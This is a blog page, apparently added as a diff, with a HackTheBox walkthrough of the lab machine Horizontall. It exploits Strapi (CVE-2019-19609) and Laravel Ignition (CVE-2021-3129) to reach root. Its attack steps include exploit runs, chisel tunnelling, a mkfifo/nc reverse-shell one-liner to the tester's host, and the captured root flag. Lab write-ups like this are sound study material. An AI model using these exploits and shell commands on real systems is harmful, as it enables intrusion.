@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Horizontall Writeup / Walkthrough Hack the box</title>
+
+  <link rel="icon" type="image/png" href="/assets/images/logo.png?v=96ad5fd1fb">
+  <link rel="apple-touch-icon" href="/assets/images/logo.png?v=96ad5fd1fb">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Space+Grotesk:wght@400;500;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <link rel="stylesheet" href="/assets/css/style.css?v=96ad5fd1fb">
+
+  <meta name="description" content="Writeup on Horizontall (Linux HackTheBox), w/o Metasploit, both user &amp; root exploitation through enumeration &amp; exploitation using CVE.">
+    <link rel="canonical" href="https://sheerazali.com/blog/horizontall-writeup-walkthrough-hack-the-box/">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    
+    <meta property="og:site_name" content="Sheeraz Ali">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="Horizontall Writeup / Walkthrough Hack the box">
+    <meta property="og:description" content="Writeup on Horizontall (Linux HackTheBox), w/o Metasploit, both user &amp; root exploitation through enumeration &amp; exploitation using CVE.">
+    <meta property="og:url" content="https://sheerazali.com/blog/horizontall-writeup-walkthrough-hack-the-box/">
+    <meta property="og:image" content="https://i0.wp.com/sheerazali.com/wp-content/uploads/2021/12/image-12-1.png?fit&#x3D;707%2C410&amp;ssl&#x3D;1">
+    <meta property="article:published_time" content="2022-02-05T05:53:13.000Z">
+    <meta property="article:modified_time" content="2022-02-10T13:27:09.000Z">
+    <meta property="article:tag" content="HackTheBox">
+    <meta property="article:tag" content="Writeup">
+    
+    <meta property="article:publisher" content="https://www.facebook.com/ghost">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Horizontall Writeup / Walkthrough Hack the box">
+    <meta name="twitter:description" content="Writeup on Horizontall (Linux HackTheBox), w/o Metasploit, both user &amp; root exploitation through enumeration &amp; exploitation using CVE.">
+    <meta name="twitter:url" content="https://sheerazali.com/blog/horizontall-writeup-walkthrough-hack-the-box/">
+    <meta name="twitter:image" content="https://i0.wp.com/sheerazali.com/wp-content/uploads/2021/12/image-12-1.png?fit&#x3D;707%2C410&amp;ssl&#x3D;1">
+    <meta name="twitter:label1" content="Written by">
+    <meta name="twitter:data1" content="sheeraz ali">
+    <meta name="twitter:label2" content="Filed under">
+    <meta name="twitter:data2" content="HackTheBox, Writeup">
+    <meta name="twitter:site" content="@beingsheerazali">
+    <meta property="og:image:width" content="707">
+    <meta property="og:image:height" content="410">
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Sheeraz Ali",
+        "url": "https://sheerazali.com/",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "https://sheerazali.com/favicon.ico"
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "sheeraz ali",
+        "image": {
+            "@type": "ImageObject",
+            "url": "https://www.gravatar.com/avatar/b78e4b3b7f8de6d5dafee8306d76ace7?s=250&r=x&d=mp",
+            "width": 250,
+            "height": 250
+        },
+        "url": "https://sheerazali.com/author/sheeraz/",
+        "sameAs": []
+    },
+    "headline": "Horizontall Writeup / Walkthrough Hack the box",
+    "url": "https://sheerazali.com/blog/horizontall-writeup-walkthrough-hack-the-box/",
+    "datePublished": "2022-02-05T05:53:13.000Z",
+    "dateModified": "2022-02-10T13:27:09.000Z",
+    "image": {
+        "@type": "ImageObject",
+        "url": "https://i0.wp.com/sheerazali.com/wp-content/uploads/2021/12/image-12-1.png?fit=707%2C410&ssl=1",
+        "width": 707,
+        "height": 410
+    },
+    "keywords": "HackTheBox, Writeup",
+    "description": "Writeup on Horizontall (Linux HackTheBox), w/o Metasploit, both user &amp; root exploitation through enumeration &amp; exploitation using CVE.",
+    "mainEntityOfPage": "https://sheerazali.com/blog/horizontall-writeup-walkthrough-hack-the-box/"
+}
+    </script>
+
+    <meta name="generator" content="Ghost 5.130">
+    <link rel="alternate" type="application/rss+xml" title="Sheeraz Ali" href="https://sheerazali.com/rss/">
+    <script defer src="https://cdn.jsdelivr.net/ghost/portal@~2.51/umd/portal.min.js" data-i18n="true" data-ghost="https://sheerazali.com/" data-key="15f06e61ecb8d951198e7015b6" data-api="https://sheerazali.com/ghost/api/content/" data-locale="en" crossorigin="anonymous"></script><style id="gh-members-styles">.gh-post-upgrade-cta-content,
+.gh-post-upgrade-cta {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    text-align: center;
+    width: 100%;
+    color: #ffffff;
+    font-size: 16px;
+}
+
+.gh-post-upgrade-cta-content {
+    border-radius: 8px;
+    padding: 40px 4vw;
+}
+
+.gh-post-upgrade-cta h2 {
+    color: #ffffff;
+    font-size: 28px;
+    letter-spacing: -0.2px;
+    margin: 0;
+    padding: 0;
+}
+
+.gh-post-upgrade-cta p {
+    margin: 20px 0 0;
+    padding: 0;
+}
+
+.gh-post-upgrade-cta small {
+    font-size: 16px;
+    letter-spacing: -0.2px;
+}
+
+.gh-post-upgrade-cta a {
+    color: #ffffff;
+    cursor: pointer;
+    font-weight: 500;
+    box-shadow: none;
+    text-decoration: underline;
+}
+
+.gh-post-upgrade-cta a:hover {
+    color: #ffffff;
+    opacity: 0.8;
+    box-shadow: none;
+    text-decoration: underline;
+}
+
+.gh-post-upgrade-cta a.gh-btn {
+    display: block;
+    background: #ffffff;
+    text-decoration: none;
+    margin: 28px 0 0;
+    padding: 8px 18px;
+    border-radius: 4px;
+    font-size: 16px;
+    font-weight: 600;
+}
+
+.gh-post-upgrade-cta a.gh-btn:hover {
+    opacity: 0.92;
+}</style>
+    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.8/umd/sodo-search.min.js" data-key="15f06e61ecb8d951198e7015b6" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.8/umd/main.css" data-sodo-search="https://sheerazali.com/" data-locale="en" crossorigin="anonymous"></script>
+    
+    <link href="https://sheerazali.com/webmentions/receive/" rel="webmention">
+    <script defer src="/public/cards.min.js?v=96ad5fd1fb"></script>
+    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=96ad5fd1fb">
+    <script defer src="/public/member-attribution.min.js?v=96ad5fd1fb"></script><style>:root {--ghost-accent-color: #FF1A75;}</style>
+</head>
+<body class="post-template tag-hackthebox tag-writeup tag-hash-import-2026-01-05-15-55">
+
+<div class="terminal-wrapper">
+
+  <header class="site-header">
+  <div class="container">
+    <div class="header-content">
+
+      <a href="https://sheerazali.com/" class="site-logo">
+        <img src="/assets/images/logo.png" alt="Sheeraz Ali">
+      </a>
+
+      <nav class="main-nav">
+        <ul>
+          <li><a href="https://sheerazali.com/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>home<span class="bracket">]</span></a></li>
+          <li><a href="/blog/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>blog<span class="bracket">]</span></a></li>
+          <li><a href="/timeline/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>timeline<span class="bracket">]</span></a></li>
+          <li><a href="/resume/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>resume<span class="bracket">]</span></a></li>
+          <li><a href="https://www.codevigilant.com/author/syed_sheeraz_ali/" target="_blank" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>cves<span class="bracket">]</span></a></li>
+          <li><a href="https://sheerazali.com/#contact" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>contact<span class="bracket">]</span></a></li>
+        </ul>
+      </nav>
+
+      <div class="header-status">
+        <span class="status-indicator">
+          <span class="status-dot"></span>
+          <span class="status-text">Online</span>
+        </span>
+      </div>
+
+    </div>
+  </div>
+</header>
+
+  <main class="main-content">
+    
+<article class="single-post">
+  <div class="container">
+
+    <header class="post-header">
+      <div class="post-meta-top">
+        <a href="https://sheerazali.com/tag/hackthebox/" class="post-category">HackTheBox</a>
+        <span class="post-date">February 05, 2022</span>
+        <span class="reading-time">9 min read</span>
+      </div>
+
+      <h1 class="post-title glitch" data-text="Horizontall Writeup / Walkthrough Hack the box">Horizontall Writeup / Walkthrough Hack the box</h1>
+
+      <div class="post-author">
+        <span class="author-label">Author:</span>
+        <a href="https://sheerazali.com/author/sheeraz/">sheeraz ali</a>
+      </div>
+    </header>
+
+    <div class="featured-image">
+      <img src="https://i0.wp.com/sheerazali.com/wp-content/uploads/2021/12/image-12-1.png?fit&#x3D;707%2C410&amp;ssl&#x3D;1" alt="Horizontall Writeup / Walkthrough Hack the box">
+    </div>
+
+    <div class="post-body">
+      <div class="content-wrapper">
+        <div class="terminal-window">
+          <div class="terminal-header">
+            <span class="terminal-dot red"></span>
+            <span class="terminal-dot yellow"></span>
+            <span class="terminal-dot green"></span>
+            <span class="terminal-title">Horizontall Writeup / Walkthrough Hack the box</span>
+          </div>
+          <div class="terminal-content">
+            <h1 id="tldr">TL;DR</h1><p><strong><strong>T</strong></strong>his is a walkthrough writeup on Horizontall which is a Linux box categorized as easy on HackTheBox. Primarily, the crux about rooting this was <strong><em>enumeration</em></strong> &amp; <strong><em>CVE exploitation</em></strong>. The initial foothold was gained by enumerating and exploiting Strapi using <strong><em>CVE-2019-19609</em></strong>, and later the privilege escalation part was done using <strong><em>CVE-2021-3129</em></strong>.</p><h1 id="walkthrough">Walkthrough</h1><h2 id="horizontall-writeup-scanning-network">Horizontall Writeup: Scanning Network</h2><p>Scanning ports with Nmap :</p><pre><code class="language-markdown">Command : nmap -A -Pn -n -sC -sV -v -oN nmap.initial 10.10.11.105
+Nmap scan report for 10.10.11.105
+Host is up (0.19s latency).
+Not shown: 998 closed ports
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
+|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
+|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
+80/tcp open  http    nginx 1.14.0 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://horizontall.htb
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><p>We only got SSH on port <code>22</code> &amp; Apache WebServer on port <code>80</code>. Let’s go ahead and enumerate the website now.</p><h2 id="enumerating-the-website">Enumerating the Website</h2><p>The page we see on browsing the box IP address :</p><figure class="kg-card kg-image-card"><img src="/assets/images/blog/2021_11_image-1.png" class="kg-image" alt="Horizontall Writeup" loading="lazy" width="770" height="374"></figure><p>Intercepting the request with burp, we see :</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2021_11_image-2.png" class="kg-image" alt loading="lazy" width="770" height="145"><figcaption>Request in Burp</figcaption></figure><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2021_11_image-3.png" class="kg-image" alt loading="lazy" width="397" height="548"><figcaption>Response to redirect in Burp</figcaption></figure><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2021_11_image-4.png" class="kg-image" alt loading="lazy" width="770" height="216"><figcaption>Redirect request in Burp</figcaption></figure><p>The response. <code>Status Code 301</code>, is asking us to redirect to <code>http://horizontal.htb</code>. Seems like the server is only serving requests which have <code>HOST: horizontall.htb</code> header.</p><p>We will need to add this domain in our <code>/etc/hosts</code> file and point it to Horizontall’s IP address.</p><p>Editing the <code>/etc/hosts</code> file accordingly and adding the following entry</p><pre><code class="language-markdown">10.10.11.105    horizontall.htb</code></pre><p>Also, add the above configuration in BurpSuite, in the <em>Hostname Resolution</em>, section.</p><p><em>Adding this entry in the <code>/etc/hosts</code> file will let our system know that whatever request we send to <code>horizontall.htb</code> domain, it needs to be sent to it’s corresponding IP address (<code>/etc/hosts</code> file entry), and our system will not query the DNS for the IP address of this domain.</em></p><hr><p>We see a simple static webpage :</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2021_11_image-5.png" class="kg-image" alt="Horizontall Writeup" loading="lazy" width="770" height="397"><figcaption>/index.php</figcaption></figure><p>On enumerating the source code, we found this URL :</p><p><code>http://api-prod.horizontall.htb/reviews</code></p><p>which reveals an interesting sub-domain <code>api-prod.horizontall.htb</code>, let’s check it out later</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2021_11_image-6.png" class="kg-image" alt="Horizontall Writeup" loading="lazy" width="770" height="147"><figcaption><code>view-source:http://horizontall.htb/js/app.c68eb462.js</code></figcaption></figure><p>You could have also tried fuzzing the subdomains, which would have also revealed this subdomain.</p><h3 id="horizontall-writeup-dirbuster-subdirectories-enumeration">Horizontall Writeup:  Dirbuster (subdirectories enumeration)</h3><p>Didn’t find anything very useful here 🙁</p><pre><code class="language-markdown">DirBuster 1.0-RC1 - Report
+http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
+--------------------------------
+
+http://horizontall.htb:80
+--------------------------------
+Directories found during testing:
+
+Dirs found with a 200 response:
+
+/
+
+Dirs found with a 403 response:
+
+/js/
+/css/
+/img/
+
+--------------------------------
+Files found during testing:
+
+Files found with a 200 responce:
+
+/js/app.c68eb462.js
+/js/chunk-vendors.0e02b89e.js
+
+--------------------------------</code></pre><hr><h2 id="api-prod-sub-domain-enumeration"><code>api-prod</code> sub-domain enumeration</h2><p>Let’s enumerate this subdomain <code>api-prod</code> from that URL we found in the source code. Firstly, also configure the <code>/etc/hosts</code> for this sub-domain.</p><pre><code class="language-markdown">10.10.11.105    api-prod.horizontall.htb</code></pre><p>Browsing it in the browser :</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2021_11_image-7.png" class="kg-image" alt="Horizontall Writeup" loading="lazy" width="697" height="290"><figcaption><code>api-prod.horizontall.htb</code></figcaption></figure><h4 id="horizontall-writeup-running-dirbuster-on-api-prodhorizontallhtb">Horizontall Writeup:  <br>Running Dirbuster on <code>api-prod.horizontall.htb</code></h4><p>We did find some potential sub-directories :</p><pre><code class="language-markdown">DirBuster 1.0-RC1 - Report
+http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
+Report produced on Fri Oct 22 03:39:24 EDT 2021
+--------------------------------
+
+http://api-prod.horizontall.htb:80
+--------------------------------
+Directories found during testing:
+
+Dirs found with a 200 response:
+
+/
+
+/admin/
+/robots.txt/
+/reviews/
+
+Dirs found with a 403 response:
+
+/connect/
+/users/
+
+--------------------------------
+Files found during testing:
+
+Files found with a 200 responce:
+
+/admin/runtime~main.d078dc17.js
+/admin/main.da91597e.chunk.js
+
+--------------------------------</code></pre><p>Let’s check them out 😉</p><h2 id="strapi">Strapi</h2><p>What is Strapi ? Strapi is an open-source headless CMS used for building fast and easily manageable APIs written in JavaScript. It enables developers to make flexible API structures easily using a beautiful user interface. Strapi can be used with various databases including MongoDB, PostgreSQL, etc.</p><p>The login panel →</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2021_11_image-8.png" class="kg-image" alt="Horizontall Writeup" loading="lazy" width="770" height="279"><figcaption>strapi login</figcaption></figure><h2 id="exploiting-strapi">Exploiting Strapi</h2><p>Searching for “Strapi exploits” on google we found this “Unauthenticated RCE exploit for version 3.0.0-beta.17.4” —&gt;</p><p><a href="//www.exploit-db.com/exploits/50239">Strapi CMS 3.0.0-beta.17.4 – Remote Code Execution (RCE) (Unauthenticated) – Multiple webapps Exploit (exploit-db.com)</a></p><p>An RCE exploit, awesome!</p><h4 id="checking-strapi-version">Checking Strapi version</h4><p>But we need to verify the Strapi version. Going through the source code of the exploit we see a <code>check_version()</code> function, which sends a GET request to <code>/admin/init</code> sub-directory to get the version info.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2022_02_image-15.png" class="kg-image" alt loading="lazy" width="770" height="282"><figcaption>code snippet from the exploit</figcaption></figure><p>Thus, let us visit that URL to verify the Strapi version :</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2022_02_image-16.png" class="kg-image" alt loading="lazy" width="554" height="223"><figcaption>strapi version</figcaption></figure><p>Downloading and running the exploit :</p><p>This exploit basically resets the password for the admin account  —&gt;</p><pre><code class="language-bash">┌─[✗]─[root@kali]─[~/Desktop/Boxes/HTB/Horizontall]
+└──╼ python3 strapi_rce.py http://api-prod.horizontall.htb
+[+] Checking Strapi CMS Version running
+[+] Seems like the exploit will work!!!
+[+] Executing exploit
+
+[+] Password reset was successfully
+[+] Your email is: admin@horizontall.htb
+[+] Your new credentials are: admin:SuperStrongPassword1
+[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjM1MDYyMjAyLCJleHAiOjE2Mzc2NTQyMDJ9.shH6CVOtYx7hdXyjR90SYiUMlhRdTnCb5mPGNFS4KgU
+
+$&gt; id
+[+] Triggering Remote code executin
+[*] Rember this is a blind RCE don't expect to see output
+{"statusCode":400,"error":"Bad Request","message":[{"messages":[{"id":"An error occurred"}]}]}</code></pre><p>But it did not execute commands, tt returned a <code>400</code> status code. However, it did successfully reset the password for the admin user.</p><p>So, I went ahead to look for a Gihutb version of the same CVE and found this —&gt;</p><p><a href="//github.com/diego-tella/CVE-2019-19609-EXPLOIT/blob/main/exploit.py">CVE-2019-19609-EXPLOIT/exploit.py at main · diego-tella/CVE-2019-19609-EXPLOIT (github.com)</a></p><p>Running it with the right parameters and the JWT we previously got in the output of the exploit we used earlier; and then wait for the reverse shell on the specified port —&gt;</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2021_11_image-9.png" class="kg-image" alt="Horizontall Writeup" loading="lazy" width="770" height="73"><figcaption>running the exploit</figcaption></figure><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2021_11_image-10.png" class="kg-image" alt="Horizontall Writeup" loading="lazy" width="727" height="242"><figcaption>reverse shell</figcaption></figure><p>Nice, we have a reverse shell now 🙂</p><h2 id="user-flag">User Flag</h2><p>We can further enumerate and get the user flag —&gt;</p><pre><code class="language-bash">strapi@horizontall:~/myapi$ cd /home
+
+strapi@horizontall:/home$ ls
+developer
+
+strapi@horizontall:/home$ cd developer
+
+strapi@horizontall:/home/developer$ ls -al   
+
+total 108
+drwxr-xr-x  8 developer developer  4096 Aug  2 12:07 .
+drwxr-xr-x  3 root      root       4096 May 25 11:43 ..
+lrwxrwxrwx  1 root      root          9 Aug  2 12:05 .bash_history -&gt; /dev/null
+-rw-r-----  1 developer developer   242 Jun  1 12:53 .bash_logout
+-rw-r-----  1 developer developer  3810 Jun  1 12:47 .bashrc
+drwx------  3 developer developer  4096 May 26 12:00 .cache
+-rw-rw----  1 developer developer 58460 May 26 11:59 composer-setup.php
+drwx------  5 developer developer  4096 Jun  1 11:54 .config
+drwx------  3 developer developer  4096 May 25 11:45 .gnupg
+drwxrwx---  3 developer developer  4096 May 25 19:44 .local
+drwx------ 12 developer developer  4096 May 26 12:21 myproject
+-rw-r-----  1 developer developer   807 Apr  4  2018 .profile
+drwxrwx---  2 developer developer  4096 Jun  4 11:21 .ssh
+-r--r--r--  1 developer developer    33 Oct 24 05:33 user.txt
+lrwxrwxrwx  1 root      root          9 Aug  2 12:07 .viminfo -&gt; /dev/null
+
+strapi@horizontall:/home/developer$ cat user.txt
+cat user.txt
+82b*************************</code></pre><hr><h2 id="horizontall-writeup-privilege-escalation">Horizontall Writeup:  Privilege Escalation</h2><p>Checking the internal listening ports on the box —&gt;</p><pre><code class="language-apacheconf">strapi@horizontall:/home/developer$ netstat -lp
+
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 localhost:8000          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 localhost:mysql         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:http            0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN      -                   
+tcp        0      0 localhost:1337          0.0.0.0:*               LISTEN      1823/node /usr/bin/ 
+tcp6       0      0 [::]:http               [::]:*                  LISTEN      -                   
+tcp6       0      0 [::]:ssh                [::]:*                  LISTEN      -                   </code></pre><p>After using <code>curl</code> on internal port <code>8000 &amp; 1337</code> to examine what’s running on them, we found the following services :</p><pre><code class="language-markdown">8000 --&gt; some Laravel webpage/webapp
+1337 --&gt; strAPI</code></pre><p>Now, let us use this awesome tool called <code>chisel</code> to forward this port <code>8000</code> to our local machine. We transferred <code>chisel</code> to remote box  by hosting it on a python web server and using <code>wget</code> on the remote box to download it.</p><p>Now, setting up <code>chisel</code> to forward remote machin’es port <code>8000</code> to out local machine’s port  <code>6969</code></p><pre><code class="language-bash">Setting up the server side (local machine) for chisel port forward :
+
+┌─[root@kali]─[/opt/chisel]
+└──╼ ./chisel server --reverse -p 6969
+
+2021/10/24 04:59:31 server: Reverse tunnelling enabled
+2021/10/24 04:59:31 server: Fingerprint fFuGUnOm0oRmOGLCgLgIzJle8zEmjjTMbMqb/sYs8i8=
+2021/10/24 04:59:31 server: Listening on http://0.0.0.0:6969
+2021/10/24 05:01:55 server: session#1: tun: proxy#R:8181=&gt;8000: Listening</code></pre><pre><code class="language-bash">Setting up the client side (remote machine) for chisel port forward :
+
+strapi@horizontall:/tmp$ ./chisel client 10.10.14.8:6969 R:8181:127.0.0.1:8000
+
+./chisel client 10.10.14.8:6969 R:8181:127.0.0.1:8000
+2021/10/24 09:09:13 client: Connecting to ws://10.10.14.8:6969
+2021/10/24 09:09:14 client: Connected (Latency 179.251437ms)</code></pre><p>Great! Now let’s browse to <code>localhost:6969</code> on our local machine, we see this Laravel application running here —&gt;</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2021_11_image-11.png" class="kg-image" alt="Horizontall Writeup" loading="lazy" width="770" height="350"><figcaption>port 8000 laravel applicaition</figcaption></figure><p>We can also see the version info for Laravel on this page. This machine is running <code>Laravel v8</code> .</p><p>You know the ritual now 🙂  Let’s search for exploits for this version.</p><p>On We found this PHP deserialization exploit that gets remote code execution on Laravel debug mode :</p><p><a href="//www.exploit-db.com/exploits/49424">Laravel 8.4.2 debug mode – Remote code execution – PHP webapps Exploit (exploit-db.com)</a></p><p>Because this CVE required the path to the Laravel project log file on the remote machine (which we didn’t have and couldn’t find after enumerating the box), thus we searched for an alternate exploit and found this :</p><p><a href="//github.com/ambionics/laravel-exploits">ambionics/laravel-exploits: Exploit for CVE-2021-3129 (github.com)</a></p><p>When I first ran this exploit, it gave an error, but later on googling about that error I realized that we will need to install a dependency to run this exploit which is <code>phpggc</code> or else the exploit wil give error.</p><p>Use <code>git clone</code> on this repo to install <code>phpggc</code></p><p><a href="//github.com/ambionics/phpggc">ambionics/phpggc: PHPGGC is a library of PHP unserialize() payloads along with a tool to generate them, from command line or programmatically. (github.com)</a></p><h3 id="running-the-exploit-and-gaining-a-root-shell">Running the exploit and gaining a root shell</h3><p>Run the first command for the exploit from inside the phpggc directory.</p><pre><code class="language-bash">┌─[root@kali]─[~/Desktop/Boxes/HTB/Horizontall]
+└──╼ cd phpggc/
+
+┌─[root@kali]─[~/Desktop/Boxes/HTB/Horizontall/phpggc]
+└──╼ php -d'phar.readonly=0' ./phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system id
+
+┌─[root@kali]─[~/Desktop/Boxes/HTB/Horizontall/laravel-exploits]
+└──╼ #./laravel-ignition-rce.py http://localhost:8181/ /tmp/exploit.phar
++ Log file: /home/developer/myproject/storage/logs/laravel.log
++ Logs cleared
++ Successfully converted to PHAR !
++ Phar deserialized
+--------------------------
+uid=0(root) gid=0(root) groups=0(root)
+--------------------------
++ Logs cleared</code></pre><h2 id="root-flag">Root Flag</h2><p>Noice !</p><p>Now let’s alter the first command we ran to get a root shell.</p><p>We need to replace <code>id</code> with a reverse shell command.</p><pre><code class="language-bash">┌─[root@kali]─[~/Desktop/Boxes/HTB/Horizontall/phpggc]                                       
+└──╼ php -d'phar.readonly=0' ./phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.8 1234 &gt;/tmp/f"</code></pre><p>And now catching the reverse shell :</p><pre><code class="language-bash">┌─[root@kali]─[~/Desktop/Boxes/HTB/Horizontall]
+└──╼ nc -nvlp 1234
+listening on [any] 1234 ...
+connect to [10.10.14.8] from (UNKNOWN) [10.10.11.105] 54110
+/bin/sh: 0: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# python -c "import pty;pty.spawn('/bin/bash')"
+
+root@horizontall:/home/developer/myproject/public# cd /root
+cd /root
+
+root@horizontall:~# cat root.txt
+cat root.txt
+c956da38e0ac893e9f3dbd9c405671d9</code></pre><hr><p>Kudos for rooting Horizontall. Until next time, keep hacking and do checkout other writeups and blogs on <a href="https://sheerazali.com/">sheerazali.com</a></p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="post-tags">
+      <span class="tags-label">Tags:</span>
+      <a href="/tag/hackthebox/" class="tag">HackTheBox</a>
+      <a href="/tag/writeup/" class="tag">Writeup</a>
+    </div>
+
+  </div>
+</article>
+
+  <section class="related-posts">
+    <div class="container">
+      <h3 class="section-title"><span class="prefix">./</span>related_writeups</h3>
+      <div class="related-grid">
+        <a href="/blog/raining-cves-on-wordpress-plugins-using-semgrep-slide-deck/" class="related-card">
+          <div class="card-corner tl"></div>
+          <div class="card-corner tr"></div>
+          <div class="card-corner bl"></div>
+          <div class="card-corner br"></div>
+          <h4>Raining CVE&#x27;s on wordpress plugins using Semgrep Slide Deck</h4>
+          <span class="date">Sep 10, 2022</span>
+        </a>
+        <a href="/blog/shibboleth-writeup-walkthrough-hack-the-box/" class="related-card">
+          <div class="card-corner tl"></div>
+          <div class="card-corner tr"></div>
+          <div class="card-corner bl"></div>
+          <div class="card-corner br"></div>
+          <h4>Shibboleth Writeup / Walkthrough Hack the box</h4>
+          <span class="date">Feb 10, 2022</span>
+        </a>
+        <a href="/blog/horizontall-writeup-walkthrough-hack-the-box/" class="related-card">
+          <div class="card-corner tl"></div>
+          <div class="card-corner tr"></div>
+          <div class="card-corner bl"></div>
+          <div class="card-corner br"></div>
+          <h4>Horizontall Writeup / Walkthrough Hack the box</h4>
+          <span class="date">Feb 05, 2022</span>
+        </a>
+      </div>
+    </div>
+  </section>
+
+  </main>
+
+  <footer class="site-footer">
+  <div class="container">
+    <div class="footer-content">
+      <div class="footer-brand">
+        <span class="terminal-prefix">&gt;</span>
+        <span class="brand-text">sheeraz_ali</span>
+        <span class="cursor">_</span>
+      </div>
+      <div class="footer-links">
+        <a href="https://www.linkedin.com/in/sheeraz-ali-979943177/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin"></i></a>
+        <a href="https://www.youtube.com/@sheerazali" target="_blank" title="YouTube"><i class="fab fa-youtube"></i></a>
+        <a href="https://twitter.com/BeingSheerazAli" target="_blank" title="Twitter/X"><i class="fab fa-twitter"></i></a>
+        <a href="https://github.com/pwnmeow" target="_blank" title="GitHub"><i class="fab fa-github"></i></a>
+      </div>
+      <div class="footer-copy">
+        <span class="cmd-prompt">$</span>
+        <span class="cmd-text">echo</span>
+        <span class="cmd-string">"&copy; 2026 Sheeraz Ali. All rights reserved."</span>
+      </div>
+    </div>
+  </div>
+</footer>
+
+</div>
+
+<script src="/assets/js/main.js?v=96ad5fd1fb"></script>
+
+
+</body>
+</html>
